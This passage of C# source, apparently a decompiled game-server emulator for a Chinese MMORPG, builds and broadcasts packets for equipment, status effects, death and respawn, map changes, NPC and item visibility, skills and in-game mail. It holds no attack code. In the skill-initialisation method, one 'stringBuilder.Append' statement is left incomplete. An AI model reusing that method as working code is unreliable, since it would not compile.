000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000055AA");
			for (int i = 0; i < 31; i++)
			{
				if (i >= 16)
				{
					if (i == 30)
					{
						System.Buffer.BlockCopy(装备栏已穿装备[15].物品_byte, 0, array, 10 + i * World.发包单个物品大小, World.数据库单个物品大小);
					}
					else
					{
						System.Buffer.BlockCopy(new byte[World.发包单个物品大小], 0, array, 10 + i * World.发包单个物品大小, World.发包单个物品大小);
					}
				}
				else if (i == 15)
				{
					System.Buffer.BlockCopy(new byte[World.发包单个物品大小], 0, array, 10 + i * World.发包单个物品大小, World.发包单个物品大小);
				}
				else if (base.人物坐标_地图 == 801 && i == 11)
				{
					byte[] bytes = BitConverter.GetBytes(RxjhClass.GetDBItmeId());
					byte[] array2 = new byte[12];
					byte[] array3 = new byte[64];
					System.Buffer.BlockCopy(装备栏已穿装备[i].物品_byte, 0, array2, 0, 12);
					byte[] dst = array2;
					System.Buffer.BlockCopy(bytes, 0, dst, 0, 8);
					System.Buffer.BlockCopy(装备栏已穿装备[i].物品_byte, 12, array3, 0, 64);
					if (base.势力战派别 == "仙族")
					{
						if (base.Player_Sex == 1)
						{
							System.Buffer.BlockCopy(BitConverter.GetBytes(16900001), 0, array2, 8, 4);
						}
						else
						{
							System.Buffer.BlockCopy(BitConverter.GetBytes(26900075), 0, array2, 8, 4);
						}
					}
					else if (base.Player_Sex == 1)
					{
						System.Buffer.BlockCopy(BitConverter.GetBytes(16900672), 0, array2, 8, 4);
					}
					else
					{
						System.Buffer.BlockCopy(BitConverter.GetBytes(26900672), 0, array2, 8, 4);
					}
					System.Buffer.BlockCopy(array2, 0, array, 10 + i * World.发包单个物品大小, 12);
					System.Buffer.BlockCopy(array3, 0, array, 26 + i * World.发包单个物品大小, 64);
				}
				else if ((base.人物坐标_地图 == 9001 || base.人物坐标_地图 == 9101 || base.人物坐标_地图 == 9201) && i == 3)
				{
					System.Buffer.BlockCopy(new byte[World.发包单个物品大小], 0, array, 10 + i * World.发包单个物品大小, World.发包单个物品大小);
				}
				else
				{
					if (装备栏已穿装备[i].Get物品ID == 0L)
					{
						continue;
					}
					byte[] @byte = 装备栏已穿装备[i].GetByte();
					int num = (int)装备栏已穿装备[i].Get物品ID;
					if (i == 11)
					{
						if (装备栏已穿装备[i].FLD_SERIES == 1)
						{
							num = int.Parse(num.ToString().Remove(7) + "0");
							for (int j = 0; j < 7; j++)
							{
								ItmeClass value;
								if (!World.Itme.TryGetValue(num, out value) || value.FLD_SERIES != 2)
								{
									num++;
									continue;
								}
								num = value.FLD_PID;
								break;
							}
							if (num >= 16900830 && num <= 16900836)
							{
								num = 16900832;
							}
						}
					}
					else if (装备栏已穿装备[i].FLD_Intrgration == 1)
					{
						num -= 5000;
					}
					System.Buffer.BlockCopy(BitConverter.GetBytes(num), 0, @byte, 8, 4);
					System.Buffer.BlockCopy(@byte, 0, array, 10 + i * World.发包单个物品大小, World.发包单个物品大小);
				}
			}
			System.Buffer.BlockCopy(BitConverter.GetBytes(thisPlay.人物全服ID), 0, array, 4, 2);
			if (toPlay.Client != null)
			{
				toPlay.Client.Send多包(array, array.Length);
			}
		}

		public void 行走状态人物灵兽(byte[] wg_id, int 状态ID)
		{
			byte[] array = Converter.hexStringToByte("AA55260000003D0018000E2C09000101000000000000000000000000000000000000000000000000000055AA");
			System.Buffer.BlockCopy(wg_id, 0, array, 11, 4);
			System.Buffer.BlockCopy(BitConverter.GetBytes(状态ID), 0, array, 15, 4);
			System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物灵兽全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
			发送当前范围广播数据(array, array.Length);
		}

		public void 爆毒数据包(int 包位置)
		{
			byte[] array = Converter.hexStringToByte("AA5526006B053B0018000105000000000000FF000000120000000000000000000000000000000000AE8B55AA");
			System.Buffer.BlockCopy(BitConverter.GetBytes(包位置), 0, array, 11, 4);
			System.Buffer.BlockCopy(装备栏包裹[包位置].物品数量, 0, array, 22, 4);
			System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
		}

		public void 潜行状态(int ID)
		{
			潜行模式 = ID;
			byte[] array = Converter.hexStringToByte("AA551A00B20205200C00060000000100000001000000000000000000000055AA");
			System.Buffer.BlockCopy(BitConverter.GetBytes(ID), 0, array, 14, 4);
			System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
			发送当前范围广播数据(array, array.Length);
		}

		public void 行走状态(byte[] 封包数据, int 状态ID)
		{
			byte[] array = Converter.hexStringToByte("AA55260060033D002000010000000100010000000000000000000000000000000000000000000000000055AA");
			System.Buffer.BlockCopy(封包数据, 0, array, 10, 4);
			System.Buffer.BlockCopy(BitConverter.GetBytes(状态ID), 0, array, 16, 4);
			System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			行走状态id = 状态ID;
			if (封包数据[0] == 1 && 封包数据[1] == 0 && 封包数据[2] == 0 && 封包数据[3] == 0)
			{
				行走状态id1 = 1;
				if (base.Client != null)
				{
					BitConverter.ToInt16(array, 6);
					base.Client.Send(array, array.Length);
				}
				发送当前范围广播数据(array, array.Length);
			}
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
			发送当前范围广播数据(array, array.Length);
		}

		public void 状态效果人物灵兽(byte[] wg_id, int 开关int, int sj)
		{
			发包类 发包类 = new 发包类();
			发包类.Write8(Buffer.ToInt32(wg_id, 0));
			发包类.Write4(0);
			发包类.Write4(开关int);
			发包类.Write4(sj);
			发包类.Write4(0);
			if (base.Client != null)
			{
				base.Client.SendPak(发包类, 34560, base.人物灵兽全服ID);
			}
			发送当前范围广播数据(发包类, 34560, base.人物灵兽全服ID);
		}

		public void 状态效果New(int 状态ID, int 开关, int 时间, int 数量, int 数量类型)
		{
			发包类 发包类 = new 发包类();
			发包类.Write4(状态ID);
			发包类.Write4(开关);
			发包类.Write4(时间);
			发包类.Write4(0);
			发包类.Write4(数量);
			发包类.Write4(数量类型);
			if (base.Client != null)
			{
				base.Client.SendPak(发包类, 35328, base.人物全服ID);
			}
		}

		public void 状态效果(byte[] wg_id, int 开关int, int sj)
		{
			int num = Buffer.ToInt32(wg_id, 0);
			if (num != 242)
			{
				发包类 发包类 = new 发包类();
				发包类.Write8(num);
				发包类.Write4(0);
				发包类.Write4(开关int);
				发包类.Write4(sj);
				发包类.Write4(0);
				if (base.Client != null)
				{
					base.Client.SendPak(发包类, 34560, base.人物全服ID);
				}
				发送当前范围广播数据(发包类, 34560, base.人物全服ID);
			}
		}

		public void 增加属性(int 积分, int 武勋)
		{
			查百宝阁元宝数();
			base.Player_WuXun += 武勋;
			检察元宝数据(积分, 1);
			保存元宝数据();
			计算人物基本数据();
			更新武功和状态();
			更新HP_MP_SP();
		}

		public void 新状态效果(int wg_id, int sj, int 开关)
		{
			发包类 发包类 = new 发包类();
			发包类.Write4(wg_id);
			发包类.Write4(0);
			发包类.Write2(92);
			发包类.Write2(1);
			发包类.Write(199);
			发包类.Write(49);
			发包类.Write(174);
			发包类.Write(95);
			发包类.Write4(开关);
			发包类.Write4(sj);
			if (base.Client != null)
			{
				base.Client.SendPak(发包类, 17153, base.人物全服ID);
			}
		}

		public void 状态效果(int 异常ID, int 开关, int 异常数量, int 时间)
		{
			byte[] array = Converter.hexStringToByte("AA5546003527401538008C0300002C0100000900000001000000000000006016A2496016A2492600000014000000000000008C030000E80300000900000001000000000000000000000055AA");
			System.Buffer.BlockCopy(BitConverter.GetBytes(异常ID), 0, array, 18, 4);
			System.Buffer.BlockCopy(BitConverter.GetBytes(异常ID), 0, array, 58, 4);
			System.Buffer.BlockCopy(BitConverter.GetBytes(开关), 0, array, 22, 4);
			System.Buffer.BlockCopy(BitConverter.GetBytes(开关), 0, array, 62, 4);
			System.Buffer.BlockCopy(BitConverter.GetBytes(时间), 0, array, 38, 4);
			System.Buffer.BlockCopy(BitConverter.GetBytes(异常数量), 0, array, 42, 4);
			System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 14, 2);
			System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
		}

		public void 死亡()
		{
			try
			{
				base.Player死亡 = true;
				if (自动攻击 != null)
				{
					自动攻击.Enabled = false;
					自动攻击.Close();
					自动攻击.Dispose();
					自动攻击 = null;
				}
				行走状态id1 = 0;
				异常状态列表();
				结束异常攻击状态列表();
				结束异常防御状态列表();
				结束异常掉蓝状态列表();
				结束异常掉血状态列表();
				if (PK死亡)
				{
					if (攻击列表 != null)
					{
						攻击列表.Clear();
					}
					foreach (Players value2 in PlayList.Values)
					{
						if (查找范围玩家(80, value2) && !value2.Client.挂机 && value2.人物全服ID != base.人物全服ID && value2.攻击列表 != null && value2.攻击列表.Count != 0)
						{
							using (new Lock(value2.攻击列表, "攻击列表"))
							{
								foreach (攻击类 item in value2.攻击列表)
								{
									if (item.人物ID == base.人物全服ID)
									{
										value2.攻击列表.Remove(item);
										break;
									}
								}
							}
						}
					}
				}
				if (base.人物坐标_地图 != 7001)
				{
					if (base.人物坐标_地图 == 7101)
					{
						if (World.血战 != null)
						{
							if (World.血战.帮战主方.申请帮派ID == base.帮派Id)
							{
								if (World.血战.帮战主方.申请人物列表.ContainsKey(base.人物全服ID))
								{
									World.血战.主方分数--;
									移动(-105f, -105f, 15f, 7101);
								}
							}
							else if (World.血战.帮战客方.申请帮派ID == base.帮派Id && World.血战.帮战客方.申请人物列表.ContainsKey(base.人物全服ID))
							{
								World.血战.客方分数--;
								移动(107f, 107f, 15f, 7101);
							}
						}
						base.人物_HP = base.人物最大_HP;
						更新HP_MP_SP();
						base.Player死亡 = false;
					}
					else if (base.人物坐标_地图 == 7301)
					{
						int num = new Random().Next(0, 4);
						int num2 = 0;
						int num3 = 0;
						switch (num)
						{
						case 0:
							num2 = 0;
							num3 = 300;
							break;
						case 1:
							num2 = -300;
							num3 = 0;
							break;
						case 2:
							num2 = 300;
							num3 = 0;
							break;
						case 3:
							num2 = 0;
							num3 = -300;
							break;
						}
						移动(num2, num3, 15f, 7301);
						base.人物_HP = base.人物最大_HP;
						更新HP_MP_SP();
						base.Player死亡 = false;
					}
					else if (base.人物坐标_地图 == 801)
					{
						if (World.势力战进程 != 0)
						{
							势力战复活选择();
						}
						base.Player死亡 = true;
					}
					else if (base.人物坐标_地图 == 2301)
					{
						Random random = new Random();
						移动(120 + random.Next(-70, 70), random.Next(-70, 70), 15f, 2301);
						base.人物_HP = base.人物最大_HP;
						更新HP_MP_SP();
						base.Player死亡 = false;
					}
					else if (base.人物坐标_地图 == 2341)
					{
						Random random2 = new Random();
						移动(120 + random2.Next(-70, 70), random2.Next(-70, 70), 15f, 2341);
						base.人物_HP = base.人物最大_HP;
						更新HP_MP_SP();
						base.Player死亡 = false;
					}
					else if (base.人物坐标_地图 == 42101)
					{
						DataTable dBToDataTable = DBA.GetDBToDataTable(string.Format("select  *  from  [攻城城主]  "));
						if (base.帮派名字 == dBToDataTable.Rows[0]["攻城行会名"].ToString())
						{
							base.Player死亡 = true;
							byte[] array = Converter.hexStringToByte("AA552600010040021800140020000BFB0288001A00FB0202000100E00300000AA00D000000000000000055AA");
							System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 15, 2);
							System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 21, 2);
							if (base.Client != null)
							{
								base.Client.Send(array, array.Length);
							}
							发送当前范围广播数据(array, array.Length);
						}
						else
						{
							base.Player死亡 = true;
							byte[] array2 = Converter.hexStringToByte("AA552600010040021800140020000BFB0288001A00FB0202000100E00300000AA00D000000000000000055AA");
							System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array2, 15, 2);
							System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array2, 21, 2);
							if (base.Client != null)
							{
								base.Client.Send(array2, array2.Length);
							}
							发送当前范围广播数据(array2, array2.Length);
						}
						dBToDataTable.Dispose();
					}
					else
					{
						base.人物_HP = 0;
						base.Player死亡 = true;
						坐标Class value = new 坐标Class(base.人物坐标_X, base.人物坐标_Y, base.人物坐标_Z, base.人物坐标_地图);
						using (new Lock(土灵符坐标, "土灵符坐标"))
						{
							if (土灵符坐标.ContainsKey(2))
							{
								土灵符坐标.Remove(2);
							}
							if (!土灵符坐标.ContainsKey(2))
							{
								土灵符坐标.Add(2, value);
							}
						}
						byte[] array3 = Converter.hexStringToByte("AA552000F80488001A00F80402000100000000000100000000000000020001000000000055AA");
						if (公有药品 != null)
						{
							if (!检查符() && !检查符2())
							{
								System.Buffer.BlockCopy(BitConverter.GetBytes(1), 0, array3, 28, 2);
							}
							else
							{
								System.Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 28, 2);
							}
						}
						System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array3, 4, 2);
						if (base.Client != null)
						{
							base.Client.Send(array3, array3.Length);
						}
						发送当前范围广播数据(array3, array3.Length);
					}
				}
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "人物死亡  出错：" + ((ex != null) ? ex.ToString() : null));
			}
		}

		public void 灵兽转职业(int 正邪, int 转)
		{
			人物灵兽.FLD_JOB_LEVEL = 转;
			发包类 发包类 = new 发包类();
			发包类.Write(转);
			发包类.Write(正邪);
			if (base.Client != null)
			{
				base.Client.SendPak(发包类, 32256, base.人物灵兽全服ID);
			}
			发送当前范围广播数据(发包类, 32256, base.人物灵兽全服ID);
		}

		public void 人物转职业(int 人物正邪, int 转)
		{
			base.Player_Zx = 人物正邪;
			base.Player_Job_leve = 转;
			发包类 发包类 = new 发包类();
			发包类.Write(转);
			发包类.Write(人物正邪);
			if (base.Client != null)
			{
				base.Client.SendPak(发包类, 32256, base.人物全服ID);
			}
			发送当前范围广播数据(发包类, 32256, base.人物全服ID);
		}

		public void 烟花(int 道具ID, int 施放对象)
		{
			byte[] array = Converter.hexStringToByte("AA5512000A007F000400CD99053C000000000000000055AA");
			System.Buffer.BlockCopy(BitConverter.GetBytes(道具ID), 0, array, 10, 4);
			System.Buffer.BlockCopy(BitConverter.GetBytes(施放对象), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
			发送当前范围广播数据(array, array.Length);
		}

		public void 人物发光()
		{
			byte[] array = Converter.hexStringToByte("AA55120014047F000400A0CB0000000000000000000055AA");
			System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
			发送当前范围广播数据(array, array.Length);
		}

		public void 吃药效果(int 物品id)
		{
			发包类 发包类 = new 发包类();
			发包类.Write8(物品id);
			if (base.Client != null)
			{
				base.Client.SendPak(发包类, 32512, base.人物全服ID);
			}
			发送当前范围广播数据(发包类, 32512, base.人物全服ID);
		}

		public void 吃药效果灵兽(int 物品id)
		{
			发包类 发包类 = new 发包类();
			发包类.Write4(物品id);
			if (base.Client != null)
			{
				base.Client.SendPak(发包类, 32512, 人物灵兽.全服ID);
			}
			发送当前范围广播数据(发包类, 32512, 人物灵兽.全服ID);
		}

		public void 离开当前地图()
		{
			try
			{
				try
				{
					if (PlayList != null)
					{
						foreach (Players value in PlayList.Values)
						{
							离开当前地图(value, this);
							if (value.PlayList != null)
							{
								value.PlayList.Remove(base.人物全服ID);
							}
						}
					}
				}
				catch (Exception ex)
				{
					Form1.WriteLine(1, "离开当前地图()人物离开出错出错[" + base.Userid + "]-[" + base.UserName + "]" + ((ex != null) ? ex.ToString() : null));
				}
				try
				{
					if (NpcList != null)
					{
						foreach (NpcClass value2 in NpcList.Values)
						{
							if (value2.Contains(this))
							{
								value2.PlayList_Remove(this);
							}
						}
					}
				}
				catch (Exception ex2)
				{
					Form1.WriteLine(1, "离开当前地图()NPC离开出错[" + base.Userid + "]-[" + base.UserName + "]" + ex2.Message);
				}
				try
				{
					if (地面物品列表 != null)
					{
						foreach (地面物品类 value3 in 地面物品列表.Values)
						{
							value3.PlayList.Remove(base.人物全服ID);
						}
					}
				}
				catch (Exception ex3)
				{
					Form1.WriteLine(1, "离开当前地图()地面物品列表      离开出错[" + base.Userid + "]-[" + base.UserName + "]" + ex3.Message);
				}
			}
			catch (Exception ex4)
			{
				Form1.WriteLine(1, "离开当前地图()出错!用户[" + base.Userid + "]-[" + base.UserName + "]" + ex4.Message);
			}
			finally
			{
				if (PlayList != null)
				{
					PlayList.Clear();
				}
				if (NpcList != null)
				{
					NpcList.Clear();
				}
				if (地面物品列表 != null)
				{
					地面物品列表.Clear();
				}
			}
		}

		public void 移动离开当前地图(int tomap)
		{
			int num = 0;
			try
			{
				if (tomap != 7001 && tomap != 7101 && base.人物坐标_地图 != 7001 && base.人物坐标_地图 == 7101 && World.血战 != null && World.血战.结束 == 0)
				{
					if (World.血战.帮战主方.申请帮派ID == base.帮派Id)
					{
						if (World.血战.帮战主方.申请人物列表.ContainsKey(base.人物全服ID))
						{
							if (base.帮派人物等级 == 6)
							{
								World.血战.主方分数 = 0;
								World.血战.客方分数 = 0;
								World.血战.结束 = 2;
								World.血战.帮战主方.申请人物列表.Remove(base.人物全服ID);
								查百宝阁元宝数();
								检察元宝数据(50, 1);
								base.Player_Money += 45000000L;
								保存元宝数据();
								更新金钱和负重();
								World.血战.Dispose();
							}
							else
							{
								World.血战.主方分数--;
								World.血战.帮战主方.申请人物列表.Remove(base.人物全服ID);
							}
							关起来 = 0;
							帮战开始提示(12, 3);
						}
					}
					else if (World.血战.帮战客方.申请帮派ID == base.帮派Id && World.血战.帮战客方.申请人物列表.ContainsKey(base.人物全服ID))
					{
						if (base.帮派人物等级 == 6)
						{
							World.血战.主方分数 = 0;
							World.血战.客方分数 = 0;
							World.血战.结束 = 2;
							World.血战.帮战客方.申请人物列表.Remove(base.人物全服ID);
							查百宝阁元宝数();
							检察元宝数据(50, 1);
							base.Player_Money += 45000000L;
							保存元宝数据();
							更新金钱和负重();
							World.血战.Dispose();
						}
						else
						{
							World.血战.客方分数--;
							World.血战.帮战客方.申请人物列表.Remove(base.人物全服ID);
						}
						关起来 = 0;
						帮战开始提示(12, 3);
					}
				}
				if (tomap != 7301 && base.人物坐标_地图 == 7301 && World.帮战 != null && World.新门战进程 == 2)
				{
					foreach (帮战Class value in World.帮战list.Values)
					{
						if (value.申请帮派ID == base.帮派Id)
						{
							if (base.帮派人物等级 == 6)
							{
								foreach (Players value2 in value.申请人物列表.Values)
								{
									value2.系统提示("由于本派帮主退出帮派混战地图,系统判定本次帮战失败。");
									value2.移动(529f, 1528f, 15f, 101);
								}
								value.当前分数 = 0;
								帮战开始提示(12, 3);
								break;
							}
							帮战开始提示(0, 0);
						}
					}
				}
				if (PlayList != null)
				{
					num = 1;
					foreach (Players value3 in PlayList.Values)
					{
						if (value3.Client != null && value3.Client.Running)
						{
							离开当前地图(this, value3);
							离开当前地图(value3, this);
							value3.PlayList.Remove(base.人物全服ID);
						}
					}
				}
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "移动离开当前地图()出错!用户" + num + "[" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
			}
			finally
			{
				if (PlayList != null)
				{
					PlayList.Clear();
				}
			}
		}

		public void 发送呐喊消息广播数据(byte[] data, int length)
		{
			try
			{
				foreach (Players value in World.allConnectedChars.Values)
				{
					if (value.UserName != base.UserName && 查找范围玩家(300, value) && value.Client != null && value.Client.Running && !value.Client.挂机)
					{
						value.Client.Send(data, length);
					}
				}
			}
			catch
			{
			}
		}

		public void 发送狮子吼消息广播数据(byte[] data, int length)
		{
			try
			{
				foreach (Players value in World.allConnectedChars.Values)
				{
					if (value.Client != null && value.Client.Running && !value.Client.挂机)
					{
						value.Client.Send(data, length);
					}
				}
			}
			catch
			{
			}
		}

		public bool 查找范围玩家(int far_, Players Playe)
		{
			if (Playe.人物坐标_地图 != base.人物坐标_地图)
			{
				return false;
			}
			float num = Playe.人物坐标_X - base.人物坐标_X;
			float num2 = Playe.人物坐标_Y - base.人物坐标_Y;
			return (int)Math.Sqrt((double)num * (double)num + (double)num2 * (double)num2) <= far_;
		}

		public void 获取复查范围玩家()
		{
			try
			{
				if (PlayList != null && !base.Client.挂机)
				{
					Queue queue = Queue.Synchronized(new Queue());
					foreach (Players value2 in World.allConnectedChars.Values)
					{
						queue.Enqueue(value2);
					}
					while (queue.Count > 0)
					{
						Players players = (Players)queue.Dequeue();
						if (players.Client != null && players.Client.Running && players.人物全服ID != base.人物全服ID)
						{
							Players value;
							if (查找范围玩家(400, players))
							{
								if (!PlayList.TryGetValue(players.人物全服ID, out value))
								{
									PlayList.Add(players.人物全服ID, players);
									更新人物数据(players);
								}
								if (!players.PlayList.TryGetValue(base.人物全服ID, out value))
								{
									players.PlayList.Add(base.人物全服ID, this);
									players.更新人物数据(this);
								}
							}
							else if (PlayList.TryGetValue(players.人物全服ID, out value))
							{
								PlayList.Remove(players.人物全服ID);
								离开当前地图(this, players);
								players.PlayList.Remove(base.人物全服ID);
								离开当前地图(players, this);
							}
						}
					}
				}
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "获取复查范围玩家()出错!用户[" + base.Userid + "]-[" + base.UserName + "]" + ((ex != null) ? ex.ToString() : null));
			}
		}

		public bool 查找范围Npc(int far_, NpcClass Npc)
		{
			if (Npc.Rxjh_Map != base.人物坐标_地图)
			{
				return false;
			}
			if (base.人物坐标_地图 == 7101)
			{
				far_ = 1000;
			}
			float num = Npc.Rxjh_X - base.人物坐标_X;
			float num2 = Npc.Rxjh_Y - base.人物坐标_Y;
			return (double)(int)Math.Sqrt((double)num * (double)num + (double)num2 * (double)num2) <= (double)far_;
		}

		public bool 查找范围Npc(int NPCID, int far_)
		{
			NpcClass npcClass = null;
			foreach (NpcClass value in NpcList.Values)
			{
				if (value.FLD_PID == NPCID)
				{
					npcClass = value;
					break;
				}
			}
			if (npcClass != null && npcClass.Rxjh_Map == base.人物坐标_地图)
			{
				float num = npcClass.Rxjh_X - base.人物坐标_X;
				float num2 = npcClass.Rxjh_Y - base.人物坐标_Y;
				return (double)(int)Math.Sqrt((double)num * (double)num + (double)num2 * (double)num2) <= (double)far_;
			}
			return false;
		}

		public void 获取复查范围Npc()
		{
			try
			{
				if (NpcList != null && !base.Client.挂机)
				{
					Dictionary<int, NpcClass> dictionary = new Dictionary<int, NpcClass>();
					Dictionary<int, NpcClass> dictionary2 = new Dictionary<int, NpcClass>();
					NpcClass value;
					foreach (NpcClass value2 in NpcList.Values)
					{
						if (!查找范围Npc(400, value2))
						{
							NpcList.Remove(value2.FLD_INDEX);
							if (!dictionary2.TryGetValue(value2.FLD_INDEX, out value))
							{
								dictionary2.Add(value2.FLD_INDEX, value2);
							}
							if (base.Client != null && value2.Contains(this))
							{
								value2.PlayList_Remove(this);
							}
						}
					}
					foreach (NpcClass value3 in MapClass.GetnpcTemplate(base.人物坐标_地图).Values)
					{
						if (查找范围Npc(400, value3))
						{
							if (!NpcList.TryGetValue(value3.FLD_INDEX, out value))
							{
								NpcList.Add(value3.FLD_INDEX, value3);
								value3.PlayList_Add(this);
								if (!dictionary.TryGetValue(value3.FLD_INDEX, out value))
								{
									dictionary.Add(value3.FLD_INDEX, value3);
								}
							}
						}
						else if (NpcList.TryGetValue(value3.FLD_INDEX, out value))
						{
							NpcList.Remove(value3.FLD_INDEX);
							if (base.Client != null && value3.Contains(this))
							{
								value3.PlayList_Remove(this);
							}
							if (!dictionary2.TryGetValue(value3.FLD_INDEX, out value))
							{
								dictionary2.Add(value3.FLD_INDEX, value3);
							}
						}
					}
					NpcClass.更新NPC删除数据(dictionary2, this);
					NpcClass.更新NPC数据(dictionary, this);
				}
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "获取复查范围NPC()出错!用户[" + base.Userid + "]-[" + base.UserName + "]" + ((ex != null) ? ex.ToString() : null));
			}
		}

		public bool 查找范围地面物品(int far_, 地面物品类 地面物品)
		{
			if (地面物品.Rxjh_Map != base.人物坐标_地图)
			{
				return false;
			}
			float num = 地面物品.Rxjh_X - base.人物坐标_X;
			float num2 = 地面物品.Rxjh_Y - base.人物坐标_Y;
			return (double)(int)Math.Sqrt((double)num * (double)num + (double)num2 * (double)num2) <= (double)far_;
		}

		public NpcClass NpcListContains(int index)
		{
			if (NpcList != null && NpcList.Count != 0)
			{
				NpcClass value;
				if (NpcList.TryGetValue(index, out value))
				{
					return value;
				}
				return null;
			}
			return null;
		}

		public void 获取复查范围地面物品()
		{
			if (地面物品列表 != null)
			{
				try
				{
					Queue queue = Queue.Synchronized(new Queue());
					Dictionary<long, 地面物品类> dictionary = new Dictionary<long, 地面物品类>();
					foreach (地面物品类 value in 地面物品列表.Values)
					{
						if (!World.ItmeTeM.ContainsKey(value.id))
						{
							queue.Enqueue(value.id);
							if (地面物品列表.ContainsKey(value.id))
							{
								地面物品列表.Remove(value.id);
							}
						}
					}
					foreach (地面物品类 value2 in World.ItmeTeM.Values)
					{
						if (查找范围地面物品(400, value2))
						{
							if (!地面物品列表.ContainsKey(value2.id))
							{
								地面物品列表.Add(value2.id, value2);
								if (value2.PlayList != null)
								{
									if (!value2.PlayList.ContainsKey(base.人物全服ID))
									{
										value2.PlayList.Add(base.人物全服ID, this);
									}
									if (!dictionary.ContainsKey(value2.id))
									{
										dictionary.Add(value2.id, value2);
									}
								}
							}
						}
						else if (地面物品列表.ContainsKey(value2.id))
						{
							queue.Enqueue(value2.id);
							地面物品列表.Remove(value2.id);
						}
					}
					while (queue.Count > 0)
					{
						地面物品消失((long)queue.Dequeue());
					}
					地面物品增加(dictionary);
				}
				catch (Exception)
				{
				}
			}
		}

		public void 初始化职业技能()
		{
			int num = 0;
			try
			{
				List<武功类> list = new List<武功类>();
				foreach (武功类 value in World.TBL_KONGFU.Values)
				{
					if (value.FLD_PID != 710100 && value.FLD_PID != 710101 && value.FLD_PID != 710102 && value.FLD_PID != 710103 && value.FLD_JOB == base.Player_Job)
					{
						list.Add(value);
					}
				}
				StringBuilder stringBuilder = new StringBuilder();
				stringBuilder.Append
				byte[] array = Converter.hexStringToByte(stringBuilder.ToString());
				System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
				for (int i = 0; i < list.Count; i++)
				{
					if (list[i].FLD_INDEX <= 31 && list[i].FLD_INDEX != -1)
					{
						int num2 = i % 200;
						int num3 = list[i].FLD_CDTIME;
						System.Buffer.BlockCopy(BitConverter.GetBytes(list[i].FLD_PID), 0, array, 16 + num2 * 56, 4);
						if (base.Player_Job == 8 && num3 > 1000 && base.韩_升天二气功_内息行心 != 0.0)
						{
							num3 = (int)((double)num3 * (1.0 - base.韩_升天二气功_内息行心));
							if (num3 < 1000)
							{
								num3 = 1000;
							}
						}
						System.Buffer.BlockCopy(BitConverter.GetBytes(num3), 0, array, 16 + num2 * 56 + 32, 4);
						int fLD_武功类型 = list[i].FLD_武功类型;
						num = list[i].FLD_PID;
						if ((fLD_武功类型 == 0 || fLD_武功类型 == 3) && 武功新[list[i].FLD_武功类型, list[i].FLD_INDEX] != null)
						{
							武功新[list[i].FLD_武功类型, list[i].FLD_INDEX].FLD_CDTIME = num3;
						}
					}
				}
				if (base.Client != null)
				{
					base.Client.Send(array, array.Length);
				}
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "初始化职业技能()出错" + base.人物全服ID + "|  技能ID" + num + ex.Message);
			}
		}

		public void 查看传书(byte[] data, int length)
		{
			try
			{
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "查看传书出错()出错" + base.人物全服ID + "|      " + ex.Message);
			}
		}

		public void 发送传书(byte[] data, int length)
		{
			try
			{
				if ((int)DateTime.Now.Subtract(传书时间).TotalMilliseconds >= 300000)
				{
					传书时间 = DateTime.Now;
					int num = data[33];
					if (num > 99)
					{
						num = 99;
					}
					byte[] array = new byte[num];
					string text;
					try
					{
						System.Buffer.BlockCopy(data, 35, array, 0, array.Length);
						text = Encoding.Default.GetString(array).Replace("\0", string.Empty).Trim();
					}
					catch (Exception ex)
					{
						Form1.WriteLine(1, "发送传书出错1![" + base.Userid + "]-[" + base.UserName + "]" + array.Length + "      " + ex.Message);
						return;
					}
					byte[] array2 = new byte[15];
					System.Buffer.BlockCopy(data, 12, array2, 0, array2.Length);
					string 对方名字 = Encoding.Default.GetString(array2).Replace("\0", string.Empty).Trim();
					if (text.Length > 0)
					{
						创建传书(this, 对方名字, 0, text, 2, 0);
					}
				}
			}
			catch (Exception ex2)
			{
				Form1.WriteLine(1, "传书错误：" + ex2.Message);
			}
		}

		public void 创建传书(Players 发送人, string 对方名字, int IsNpc, string 消息内容, int 消息类型, int 数量)
		{
			try
			{
				if (base.Player_Money < 10000L)
				{
					系统提示("资金不足。");
				}
				else
				{
					base.Player_Money -= 10000L;
					更新金钱和负重();
					if (RxjhClass.GetUserName(对方名字) != 1)
					{
						Players players = 得到人物数据(对方名字);
